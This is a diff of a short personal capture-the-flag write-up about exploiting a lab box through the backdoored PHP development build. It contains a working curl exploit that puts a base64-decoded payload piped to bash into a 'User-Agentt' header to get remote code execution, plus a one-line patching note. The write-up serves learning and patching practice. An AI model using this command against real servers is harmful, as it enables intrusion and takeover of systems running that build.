@@ -8,6 +8,7 @@ Difficulty:  Easy
 Goals:  
 - Quick B2R as I going loads of everything else today.
 Learnt:
+- Supply Chain attacks are pretty awesome
 Beyond Root:
 - Patch it
 
@@ -40,7 +41,7 @@ curl http://10.10.129.151  -H 'User-Agentt: zerodiumsystem("echo $base64encodedp
 Regardless
 
 ```bash
-curl http://10.10.129.151  -H 'User-Agentt: zerodiumsystem('"echo $base64encodedpayload | base64 -d | bash"');' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'
+curl http://10.10.129.151  -H "User-Agentt: zerodiumsystem('echo $base64encodedpayload | base64 -d | bash');" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'
 ```
 
 ## Foothold && PrivEsc
@@ -53,5 +54,4 @@ And we are Root
 This box was very easy, but I want to practice and showcase patching this. Also I want to try manual without lookup finding the code and patching it. We are also ina docker container so I could try a container escape.
 ![](weareinadockercontainer.png)
 
-
-
+Patching - downgrade to 8.0 or upgrade to a later version
